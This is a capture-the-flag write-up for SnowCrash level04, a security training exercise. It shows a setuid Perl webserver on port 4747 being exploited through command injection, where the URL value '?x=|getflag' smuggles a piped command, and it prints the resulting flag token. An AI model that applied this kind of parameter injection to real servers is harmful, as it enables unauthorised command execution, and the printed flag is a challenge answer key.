## Level 04

We can see level04 a level04.pl file in our home directory.

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

When we look at level04.pl file, we see that we have a webserver running in localhost:4747 address. We can confirm that the server is running by using the following command:

```bash
level04@SnowCrash:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
tcp6       0      0 :::4646                 :::*                    LISTEN
tcp6       0      0 :::4747                 :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::4242                 :::*                    LISTEN
udp        0      0 0.0.0.0:68              0.0.0.0:*
```
This perl file echo the content provided in the x param.

As the website run command, we can write http://192.168.56.101:4747/?x=|getflag in the URL to get the flag. The pipe is added to execute the getflag command.

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
